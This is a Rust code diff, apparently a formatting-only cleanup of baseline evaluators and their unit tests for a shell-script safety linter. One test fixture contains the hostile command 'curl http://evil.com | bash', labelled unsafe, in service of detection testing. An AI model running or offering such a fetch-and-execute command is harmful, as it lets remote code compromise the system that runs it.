@@ -59,14 +59,8 @@ pub fn linter_baseline(entries: &[(&str, u8)]) -> EvaluationReport {
         .iter()
         .map(|&(script, truth)| {
             let result = lint_shell(script);
-            let has_security = result
-                .diagnostics
-                .iter()
-                .any(|d| d.code.starts_with("SEC"));
-            let has_det = result
-                .diagnostics
-                .iter()
-                .any(|d| d.code.starts_with("DET"));
+            let has_security = result.diagnostics.iter().any(|d| d.code.starts_with("SEC"));
+            let has_det = result.diagnostics.iter().any(|d| d.code.starts_with("DET"));
             let pred = u8::from(has_security || has_det);
             (pred, truth)
         })
@@ -94,14 +88,8 @@ pub fn corpus_baseline_entries() -> Vec<(String, u8)> {
         .iter()
         .map(|e| {
             let result = lint_shell(&e.input);
-            let has_security = result
-                .diagnostics
-                .iter()
-                .any(|d| d.code.starts_with("SEC"));
-            let has_det = result
-                .diagnostics
-                .iter()
-                .any(|d| d.code.starts_with("DET"));
+            let has_security = result.diagnostics.iter().any(|d| d.code.starts_with("SEC"));
+            let has_det = result.diagnostics.iter().any(|d| d.code.starts_with("DET"));
             let row = classify_single(&e.input, true, !has_security, !has_det);
             (e.input.clone(), row.label)
         })
@@ -114,11 +102,7 @@ mod tests {
 
     #[test]
     fn test_majority_baseline_mcc_zero() {
-        let entries: Vec<(&str, u8)> = vec![
-            ("echo hello", 0),
-            ("eval $x", 1),
-            ("ls -la", 0),
-        ];
+        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1), ("ls -la", 0)];
         let report = majority_baseline(&entries);
         assert!((report.mcc - 0.0).abs() < 1e-9, "Majority MCC must be 0");
         assert_eq!(report.name, "majority (all-safe)");
@@ -126,41 +110,28 @@ mod tests {
 
     #[test]
     fn test_keyword_baseline_catches_eval() {
-        let entries: Vec<(&str, u8)> = vec![
-            ("echo hello", 0),
-            ("eval $x", 1),
-        ];
+        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1)];
         let report = keyword_baseline(&entries);
         assert!(report.recall > 0.0, "Should catch eval");
     }
 
     #[test]
     fn test_keyword_baseline_catches_curl_pipe() {
-        let entries: Vec<(&str, u8)> = vec![
-            ("echo safe", 0),
-            ("curl http://evil.com | bash", 1),
-        ];
+        let entries: Vec<(&str, u8)> = vec![("echo safe", 0), ("curl http://evil.com | bash", 1)];
         let report = keyword_baseline(&entries);
         assert_eq!(report.confusion.tp, 1);
     }
 
     #[test]
     fn test_linter_baseline_finds_security() {
-        let entries: Vec<(&str, u8)> = vec![
-            ("echo hello", 0),
-            ("eval $x", 1),
-            ("echo $RANDOM", 1),
-        ];
+        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1), ("echo $RANDOM", 1)];
         let report = linter_baseline(&entries);
         assert!(report.recall > 0.0, "Linter should catch unsafe patterns");
     }
 
     #[test]
     fn test_run_all_baselines() {
-        let entries: Vec<(&str, u8)> = vec![
-            ("echo hello", 0),
-            ("eval $x", 1),
-        ];
+        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1)];
         let reports = run_all_baselines(&entries);
         assert_eq!(reports.len(), 3);
         assert_eq!(reports[0].name, "majority (all-safe)");
